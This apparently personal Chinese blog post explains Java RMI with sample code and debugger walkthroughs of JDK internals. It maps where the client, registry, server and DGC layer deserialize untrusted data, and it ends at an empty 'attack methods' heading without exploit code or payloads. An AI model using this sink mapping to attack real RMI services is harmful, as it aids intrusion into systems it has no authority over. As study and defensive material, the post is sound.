---
title: RMI
date: 2025-09-20T15:00:00+08:00
tags:
  - "java 学习"
categories:
  - "Java"
description: RMI基础及几种攻击方式
showToc: true
draft: false
tocOpen: true
---
## 1、RMI是什么
> Java RMI用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟上中的对象的方法，只不过是允许被远程调用的对象要通过一些标志加以标识。这样做的特点如下：
>
> 优点：避免重复造轮子；
>
> 缺点：调用过程很慢，而且该过程是不可靠的，容易发生不可预料的错误，比如网络错误等；
>
> 在RMI中的核心是远程对象（remote object），除了对象本身所在的虚拟机，其他虚拟机也可以调用此对象的方法，而且这些虚拟机可以不在同一个主机上。每个远程对象都要实现一个或者多个远程接口来标识自己，声明了可以被外部系统或者应用调用的方法（当然也有一些方法是不想让人访问的）。
>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053743.png)

## 2、RMI 基本实现
### 客户端
```java
package com.example;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IRemoteObj extends Remote {

    public String sayHello(String keywords) throws RemoteException;

}
```

```java
package com.example;

import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIClient {
    public static void main(String[] args) throws RemoteException, NotBoundException {
        Registry registry = LocateRegistry.getRegistry("127.0.0.1", 1099);
        IRemoteObj remoteObj = (IRemoteObj) registry.lookup("remoteObj");
        remoteObj.sayHello("hello");
    }
}
```

### 服务端
```java
package com.example;

import java.rmi.Remote;
import java.rmi.RemoteException;

public interface IRemoteObj extends Remote {

    public String sayHello(String keywords) throws RemoteException;

}
```

```java
package com.example;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class RemoteObjImpl extends UnicastRemoteObject implements IRemoteObj {

    public RemoteObjImpl() throws RemoteException {

    }

    @Override
    public String sayHello(String keywords) {
        String upKeywords = keywords.toUpperCase();
        System.out.println(upKeywords);
        return upKeywords;
    }

}
```

```java
package com.example;

import java.rmi.AlreadyBoundException;
import java.rmi.NotBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIServer {
    public static void main(String[] args) throws RemoteException, AlreadyBoundException, NotBoundException {
        IRemoteObj remoteObj = new RemoteObjImpl();
        Registry r = LocateRegistry.createRegistry(1099);
        r.bind("remoteObj", remoteObj);
    }
}
```





RMI 客户端通过远程调用服务端的 sayHello 方法，成功在服务端输出了大写的“HELLO”。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242053449.png)



## 3、流程原理


![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054922.png)





### 3.1 服务端-创建远程服务
调试分析远程对象的创建过程：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054982.png)

进入其构造函数，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054278.png)

**UnicastRemoteObject **中 ，port 被默认赋值为 0

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054504.png)

步入  UnicastRemoteObject  类中的 **exportObject** （姑且称为导出对象函数）

+ <font style="color:#080808;background-color:#ffffff;">public static</font>：不需要创建 UnicastRemoteObject  实例也可以调用
    - ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250804062.png)
+ Remote obj：实现了 java.rmi.Remote 接口的对象，
+ int port： 接收客户端的请求

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054938.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054839.png)

接下进入 return exportObject(obj, new UnicastServerRef(port)); 中的  <font style="color:#080808;background-color:#ffffff;">new UnicastServerRef(port))，</font>**<font style="color:#080808;background-color:#ffffff;">UnicastServerRef</font>**<font style="color:#080808;background-color:#ffffff;">（称之为服务端引用）</font>

<font style="color:#080808;background-color:#ffffff;">var 1 这里是端口号 port ，传入 port 后，调用 父类构造函数 </font>**<font style="color:#080808;background-color:#ffffff;">LiveRef</font>**<font style="color:#080808;background-color:#ffffff;">,</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054384.png)

来到 LiveRef 的构造函数

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054590.png)

这里可以看一下 getLocalEndpoint

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054700.png)

这里的 **TCPEndpoint** 用于远程通信，其构造函数中的变量 String var1 为 host (ip) 、int var2 为 port (端口)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242054805.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055474.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055635.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055596.png)



继续跟入 <font style="color:#080808;background-color:#ffffff;">this(var1, TCPEndpoint.getLocalEndpoint(var2), true); 中的 </font>this，在此处 ep 中有了IP和端口信息

+  Endpoint ep    端点信息（IP、端口、socket）
+ Channel ch     通信通道（缓存的连接）
+ isLoacl    是否为本地对象

然后这些信息都被存放在 LiveRef 中。

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055311.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055578.png)

接下来又调用了父类方法并将 ref 赋值为 var1（var1:**LiveRef@626**）

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242055804.png)

接下来回到  <font style="color:#080808;background-color:#ffffff;">return exportObject(obj, new UnicastServerRef(port)); 中的  exportObject 方法</font>

<font style="color:#080808;background-color:#ffffff;">首先判断了 obj 是否继承了 UnicastRemoteObject ，如果没有继承那么就把 ref 设置为 sref。</font>

<font style="color:#080808;background-color:#ffffff;">之后都使用 sref.exportObject 进行工作完成导出远程对象的操作</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056355.png)

而 sref 中封装着 LiveRef@626

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056610.png)

<font style="color:#080808;background-color:#ffffff;"></font>

**<font style="color:#080808;background-color:#ffffff;">sref.exportObject </font>** 的执行过程：



`stub = Util.createProxy(implClass, getClientRef(), forceStubUse);`这一步是创建**客户端代理**的过程。

> （为什么要在服务端创建客户端代理呢？）
>
> 这里通过流程图解释：服务端首先创建好 Remote Stub 放到注册中心，客户端通过注册中心拿到 Remote Stub，客户端通过 Remote Stub 调用另一个代理 Remote Skeleton ，之后 Remote Skeleton 调用服务端。
>
> ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056850.png)
>
> 
>

步入 createProxy

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056981.png)

clientRef 中存放的就是那个核心 LiveRef@783 （上文是 LiveRef@626，核心都是相同的）

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056845.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056633.png)

此处进行了判断：

+ forceStubUse：如果为 `true`，就强制使用旧的 **静态 Stub 类**（由 `rmic` 工具生成的 `_Stub.class`）这是为了兼容 JDK 1.1 时代的 RMI，这种情况直接调用 `createStub(...)` 去加载和实例化 Stub
+ ignoreStubClasses：如果为 `true`，表示忽略静态 Stub 类。这时会尝试用 **动态代理**（`java.lang.reflect.Proxy`）来生成 Stub
+ stubClassExists：

```java
private static boolean stubClassExists(Class<?> remoteClass) {
    //先看缓存：withoutStubs 用来存放 “已经确定没有 Stub 的类”
    if (!withoutStubs.containsKey(remoteClass)) {
        try {
            //尝试用 Class.forName 加载 [远程类名 + "_Stub"] 这个类
            Class.forName(remoteClass.getName() + "_Stub",
                          false,
                          remoteClass.getClassLoader());
            return true; //如果能加载成功，说明确实存在 Stub 类

        } catch (ClassNotFoundException cnfe) {
            // 如果加载不到，说明这个远程类没有对应的 "_Stub"
            //  那么就把它记到 withoutStubs 缓存里，下次查询就直接返回 false
            withoutStubs.put(remoteClass, null);
        }
    }
    return false; //如果缓存里已有，或者加载失败，就返回 false
}

```

如果要进入 createStub ，**强制使用 Stub**`forceStubUse == true`，**没有忽略 Stub 并且存在 Stub 类**`ignoreStubClasses == false``stubClassExists(remoteClass) == true`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056496.png)

下一步创建动态代理

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056087.png)

其中的 handler 存放 LiveRef@783

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242056321.png)

这样就创建好了动态代理 **stub**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057316.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057112.png)

进入 Target （实际上是将目前创建的东西都封装到一起）

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057390.png)

**客户端引用（stub）和服务端引用（disp）的 LiveRef 是一样的，**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057434.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057072.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057553.png)

接下来，将封装好的 target 发布出去

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057747.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242057010.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058476.png)

跟到了 TCPTransport 类中的 exportObject

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058357.png)

listen() 函数先获取 **TCPEndpoint@823**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805468.png)

准备创建 ServerSocket

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058662.png)

判断 port 是否为 0，如果为 0 ，进入 setDefaultPort，设置端口号

```java
if (listenPort == 0)
    setDefaultPort(server.getLocalPort(), csf, ssf);
```

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058959.png)

进入 server.getLocalPort 

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058480.png)

在这个函数中端口被赋值，此端口随机，

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058618.png)

这个时候的端口被赋值为 55685

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250805487.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058891.png)



+ doPrivileged： 表示即使调用栈上其他代码没有权限，也允许这里的操作按本方法的权限执行。 
+ NewThreadAction： 创建一个新的线程

这个线程开启之后等待客户端的连接

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058990.png)

做完这些之后，用 MAP 表储存 target，target 中包括了 IP、端口、服务端代理、客户端代理等信息

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058314.png)



最后返回一些值，完成了服务端的发布过程。



到这里在返回看 **exportObject 函数的作用**：

+ 静态方法的 <font style="color:#080808;background-color:#ffffff;">exportObject 传入俩个参数，创建一个 UnicastServerRef 对象 sref ，sref 中封装了IP、端口等信息，核心是 LiveRef@xxx，然后调用 exportObject(obj, sref)</font>
+ <font style="color:#080808;background-color:#ffffff;">重载方法的 exportObject 返回代理对象 stub</font>
+ 这样就做到了把一个本地的远程对象实例导出成一个可以远程访问的对象





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058084.png)



### 3.2 注册中心-创建注册中心+绑定


![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058089.png)

调用 createRegistry  创建注册中心，默认端口号为1099

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242058574.png)

到了这一步点“恢复程序”，如果继续跟进去会发现一堆奇怪的东西

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059987.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806502.png)

来到这一步：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059539.png)

创建了一个 LiveRef，一个 lref，（这里的作用和服务端的实际上是一样的）

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059580.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059524.png)



### 3.3 客户端-请求注册中心
首先连接注册中心，接收传入的IP和端口

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059631.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059585.png)

使用LIveRef ，将传入的 host,port,等封装

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059455.png)

再次调用 <font style="color:#080808;background-color:#ffffff;">createProxy 方法，同样的创建了 stub ，（这里的创建是通过注册中心传入参数（host,port..），客户端自行创建 stub）</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059526.png)

来到下一步：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250806495.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059518.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059247.png)



#### 问题：在动态调试时遇到报错，可能是服务端没有开启！
下一步调用会报以下错误，因为服务端没有开启监听

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100821.png)

将 RMIServer 运行起来就可以了





![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242059422.png)

这里看到传进来的 var1 实际上就是`IRemoteObj remoteObj = (IRemoteObj) registry.lookup("remoteObj");`中的 `remoteObj`

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100050.png)

```java
public Remote lookup(String var1) throws AccessException, NotBoundException, RemoteException {
    try {
        //创建远程调用对象
        RemoteCall var2 = super.ref.newCall(this, operations, 2, 4905912898345647071L);

        try {
            //序列化参数，将 var1 写入输出流
            ObjectOutput var3 = var2.getOutputStream();
            var3.writeObject(var1);
        } catch (IOException var18) {
            throw new MarshalException("error marshalling arguments", var18);
        }

        //发起远程调用，
        super.ref.invoke(var2);

        Remote var23;
        try {
            ///从输入流中读取远程 registry 返回的对象
            ObjectInput var6 = var2.getInputStream();
            //
            var23 = (Remote)var6.readObject();
        } catch (IOException var15) {
            throw new UnmarshalException("error unmarshalling return", var15);
        } catch (ClassNotFoundException var16) {
            throw new UnmarshalException("error unmarshalling return", var16);
        } finally {
            super.ref.done(var2);
        }

        return var23;
    } catch (RuntimeException var19) {
        throw var19;
    } catch (RemoteException var20) {
        throw var20;
    } catch (NotBoundException var21) {
        throw var21;
    } catch (Exception var22) {
        throw new UnexpectedException("undeclared checked exception", var22);
    }
}
```

跟进 **invoke**

**super.ref.invoke(var2);**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100488.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100413.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100826.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100956.png)

StreamRemoteCall 类中的 executeCall 是真正处理网络请求的方法

**executeCall 中有一步通过反序列化处理异常，如果注册中心有恶意对象，客户端在此处反序列化时被攻击。**

**由于 executeCall 是客户端网络请求的必经之路，所以这个反序列化几乎不可避免**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100633.png)





这里的 lookup 方法的作用就是去注册中心查找远程对象



### 3.4 客户端-请求服务端
**同样注意开启服务端**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100785.png)

来到了 invoke

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100700.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100902.png)



这里又跟到了 StreamRemoteCall ，这样的请求同样可以被攻击

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100629.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101578.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242100270.png)



结束 <font style="color:#080808;background-color:#ffffff;">call.executeCall(); 后会出现另一个反序列化点</font>

进入 **unmarshalValue** 

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101064.png)

**unmarshalValue 函数的作用就是根据目标类型，选择正确的方式从输入流中读取数据**。

+ 对基本类型，用专门的 `readxxx()` 方法读取，再返回
+ 对对象类型，直接调用 `readObject()` 反序列化

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250807873.png)

returnValue 返回了 "HELLO"

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101630.png)



#### 总结-客户端产生的反序列化漏洞点
1. StreamRemoteCall.executeCall

StreamRemoteCall 类中的 executeCall 是真正处理网络请求的方法

**executeCall 中有一步通过反序列化处理异常，如果注册中心有恶意对象，客户端在此处反序列化时被攻击。**

**由于 executeCall 是客户端网络请求的必经之路，所以这个反序列化几乎不可避免**

** **

executeCall 处理的协议就是**JRMP 协议**

2. unmarshalValue

unmarshalValue 函数向服务端请求获取返回值时，返回值是通过反序列化产生的。



### 3.5 注册中心-客户端请求时
前面说过，服务端创建了 stub 并将信息封装到 target，随后的 NewThreadAction 创建了一个新的线程，等待客户端的响应

> 这个线程开启之后等待客户端的连接
>
> ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101934.png)
>

现在进入创建线程的流程：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101994.png)

进入 run() 后，只能调用 <font style="color:#080808;background-color:#ffffff;">executeAcceptLoop，executeAcceptLoop 又创建了一个新的线程</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101732.png)

run 调用了 run0

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101959.png)

run0 前面都是在解析一些协议，重点是 **handleMessages**

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242101134.png)

其中的 默认情况是调用了 serviceCall

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102514.png)

serviceCall 会从表中获取 target

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102601.png)



此处断点调试：

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102239.png)



可以看到断点处的 stub 就是服务端创建好的东西

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102908.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102432.png)

之后会调用 disp.dispatch，disp 是一个分发器，用于将远程请求分发到服务端执行

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102528.png)



![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102834.png)

这里 skel 不为空就会调用 oldDispatch

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102594.png)

<font style="color:#080808;background-color:#ffffff;">skel.dispatch</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102245.png)

而 <font style="color:#080808;background-color:#ffffff;">skel.dispatch 是属于 RegistryImpl_Skel 类中的 dispatch</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102876.png)

接下来就到了重点：

**RegistryImpl_Skel.class**

```java
public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
    if (var4 != 4905912898345647071L) {
        throw new SkeletonMismatchException("interface hash mismatch");
    } else {
        RegistryImpl var6 = (RegistryImpl)var1;
        switch (var3) {
            case 0:
                String var100;
                Remote var103;
                try {
                    ObjectInput var105 = var2.getInputStream();
                    var100 = (String)var105.readObject();
                    var103 = (Remote)var105.readObject();
                } catch (IOException var94) {
                    throw new UnmarshalException("error unmarshalling arguments", var94);
                } catch (ClassNotFoundException var95) {
                    throw new UnmarshalException("error unmarshalling arguments", var95);
                } finally {
                    var2.releaseInputStream();
                }

                var6.bind(var100, var103);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var93) {
                    throw new MarshalException("error marshalling return", var93);
                }
            case 1:
                var2.releaseInputStream();
                String[] var99 = var6.list();

                try {
                    ObjectOutput var102 = var2.getResultStream(true);
                    var102.writeObject(var99);
                    break;
                } catch (IOException var92) {
                    throw new MarshalException("error marshalling return", var92);
                }
            case 2:
                String var98;
                try {
                    ObjectInput var104 = var2.getInputStream();
                    //此处为注册中心，直接调用了反序列化
                    var98 = (String)var104.readObject();
                } catch (IOException var89) {
                    throw new UnmarshalException("error unmarshalling arguments", var89);
                } catch (ClassNotFoundException var90) {
                    throw new UnmarshalException("error unmarshalling arguments", var90);
                } finally {
                    var2.releaseInputStream();
                }

                Remote var101 = var6.lookup(var98);

                try {
                    ObjectOutput var9 = var2.getResultStream(true);
                    var9.writeObject(var101);
                    break;
                } catch (IOException var88) {
                    throw new MarshalException("error marshalling return", var88);
                }
            case 3:
                Remote var8;
                String var97;
                try {
                    ObjectInput var11 = var2.getInputStream();
                    var97 = (String)var11.readObject();
                    var8 = (Remote)var11.readObject();
                } catch (IOException var85) {
                    throw new UnmarshalException("error unmarshalling arguments", var85);
                } catch (ClassNotFoundException var86) {
                    throw new UnmarshalException("error unmarshalling arguments", var86);
                } finally {
                    var2.releaseInputStream();
                }

                var6.rebind(var97, var8);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var84) {
                    throw new MarshalException("error marshalling return", var84);
                }
            case 4:
                String var7;
                try {
                    ObjectInput var10 = var2.getInputStream();
                    var7 = (String)var10.readObject();
                } catch (IOException var81) {
                    throw new UnmarshalException("error unmarshalling arguments", var81);
                } catch (ClassNotFoundException var82) {
                    throw new UnmarshalException("error unmarshalling arguments", var82);
                } finally {
                    var2.releaseInputStream();
                }

                var6.unbind(var7);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var80) {
                    throw new MarshalException("error marshalling return", var80);
                }
            default:
                throw new UnmarshalException("invalid method number");
        }

    }
}
```







#### 总结-注册中心产生的漏洞点
1. 客户端在请求时 （`IRemoteObj remoteObj = (IRemoteObj) registry.lookup("remoteObj");`），`lookup`的对象是序列化后传到注册中心的，而注册中心的 **RegistryImpl_Skel **中，大部分 case 的函数都有反序列化。如果是一个恶意序列化对象，在注册中心运行到 **RegistryImpl_Skel **时，会产生反序列化漏洞 `var98 = (String)var104.readObject();`



### 3.6 服务端-客户端请求时
过程和注册中心被客户端请求时一样，但要注意，调试的时候需要代理是动态代理，按 F9 让程序往下运行直到得到动态代理。

图中的 RegistryImpl_Stub   DGCImpl_Stub 都不是想要的

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509250808002.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102343.png)

最终拿到的 $Proxy0 是我们需要的动态代理

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102929.png)

同样来到 disp.dispatch

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102257.png)

不一样的是在 `skel != null`判断时，此时的 skel 为空，不进入 oldDispatch

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102391.png)

继续走，获取远程方法 sayHello

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102266.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102994.png)



之后会进入 <font style="color:#080808;background-color:#ffffff;">unmarshalValue，在 客户端产生的反序列化漏洞点 中也有 unmarshalValue</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102963.png)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242102427.png)

最终在 `result = method.invoke(obj, params);`<font style="color:#080808;background-color:#ffffff;"> 这一步完成远程调用</font>

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509242103076.png)



### 3.7 DGC-客户端请求服务端
> <font style="color:rgb(51, 51, 51);">分布式垃圾回收，又称DGC，RMI使用DGC来做垃圾回收，因为跨虚拟机的情况下要做垃圾回收没办法使用原有的机制。我们使用的远程对象只有在客户端和服务端都不受引用时才会结束生命周期。</font>
>
> <font style="color:rgb(51, 51, 51);">而既然RMI依赖于DGC做垃圾回收，那么在RMI服务中必然会有DGC层，在yso中攻击DGC层对应的是JRMPClient，在攻击RMI Registry小节中提到了skel和stub对应的Registry的服务端和客户端，同样的，DGC层中也会有skel和stub对应的代码，也就是DGCImpl_Skel和DGCImpl_Stub，我们可以直接从此处分析，避免冗长的debug。</font>
>
> <font style="color:rgb(51, 51, 51);">而客户端一方在使用服务端的远程引用时需要调用dirty来注册，在用完时需要调用clean进行清除。</font>
>



**<font style="color:#080808;background-color:#ffffff;">DGCImpl_Stub</font>**

<font style="color:rgb(80, 80, 92);">clean 就是”强”清除内存，dirty 就是”弱”清除内存</font>

<font style="color:rgb(80, 80, 92);">这里调用了 </font>`readObject()`<font style="color:rgb(80, 80, 92);"> 方法，存在反序列化的入口类。</font>

```java
public void clean(ObjID[] var1, long var2, VMID var4, boolean var5) throws RemoteException {
    try {
        RemoteCall var6 = super.ref.newCall(this, operations, 0, -669196253586618813L);

        try {
            ObjectOutput var7 = var6.getOutputStream();
            var7.writeObject(var1);
            var7.writeLong(var2);
            var7.writeObject(var4);
            var7.writeBoolean(var5);
        } catch (IOException var8) {
            throw new MarshalException("error marshalling arguments", var8);
        }

        super.ref.invoke(var6);
        super.ref.done(var6);
    } catch (RuntimeException var9) {
        throw var9;
    } catch (RemoteException var10) {
        throw var10;
    } catch (Exception var11) {
        throw new UnexpectedException("undeclared checked exception", var11);
    }
}

public Lease dirty(ObjID[] var1, long var2, Lease var4) throws RemoteException {
    try {
        RemoteCall var5 = super.ref.newCall(this, operations, 1, -669196253586618813L);

        try {
            ObjectOutput var6 = var5.getOutputStream();
            var6.writeObject(var1);
            var6.writeLong(var2);
            var6.writeObject(var4);
        } catch (IOException var20) {
            throw new MarshalException("error marshalling arguments", var20);
        }

        super.ref.invoke(var5);

        Lease var24;
        try {
            ObjectInput var9 = var5.getInputStream();
            var24 = (Lease)var9.readObject();
        } catch (IOException var17) {
            throw new UnmarshalException("error unmarshalling return", var17);
        } catch (ClassNotFoundException var18) {
            throw new UnmarshalException("error unmarshalling return", var18);
        } finally {
            super.ref.done(var5);
        }

        return var24;
    } catch (RuntimeException var21) {
        throw var21;
    } catch (RemoteException var22) {
        throw var22;
    } catch (Exception var23) {
        throw new UnexpectedException("undeclared checked exception", var23);
    }
}
```

**<font style="color:rgb(51, 51, 51);">DGCImpl_Skel</font>**

<font style="color:rgb(51, 51, 51);">也存在漏洞点</font>

```java
public void dispatch(Remote var1, RemoteCall var2, int var3, long var4) throws Exception {
    if (var4 != -669196253586618813L) {
        throw new SkeletonMismatchException("interface hash mismatch");
    } else {
        DGCImpl var6 = (DGCImpl)var1;
        switch (var3) {
            case 0:
                ObjID[] var39;
                long var40;
                VMID var41;
                boolean var42;
                try {
                    ObjectInput var14 = var2.getInputStream();
                    var39 = (ObjID[])var14.readObject();
                    var40 = var14.readLong();
                    var41 = (VMID)var14.readObject();
                    var42 = var14.readBoolean();
                } catch (IOException var36) {
                    throw new UnmarshalException("error unmarshalling arguments", var36);
                } catch (ClassNotFoundException var37) {
                    throw new UnmarshalException("error unmarshalling arguments", var37);
                } finally {
                    var2.releaseInputStream();
                }

                var6.clean(var39, var40, var41, var42);

                try {
                    var2.getResultStream(true);
                    break;
                } catch (IOException var35) {
                    throw new MarshalException("error marshalling return", var35);
                }
            case 1:
                ObjID[] var7;
                long var8;
                Lease var10;
                try {
                    ObjectInput var13 = var2.getInputStream();
                    var7 = (ObjID[])var13.readObject();
                    var8 = var13.readLong();
                    var10 = (Lease)var13.readObject();
                } catch (IOException var32) {
                    throw new UnmarshalException("error unmarshalling arguments", var32);
                } catch (ClassNotFoundException var33) {
                    throw new UnmarshalException("error unmarshalling arguments", var33);
                } finally {
                    var2.releaseInputStream();
                }

                Lease var11 = var6.dirty(var7, var8, var10);

                try {
                    ObjectOutput var12 = var2.getResultStream(true);
                    var12.writeObject(var11);
                    break;
                } catch (IOException var31) {
                    throw new MarshalException("error marshalling return", var31);
                }
            default:
                throw new UnmarshalException("invalid method number");
        }

    }
}
```









## 4、RMI的几种攻击方式
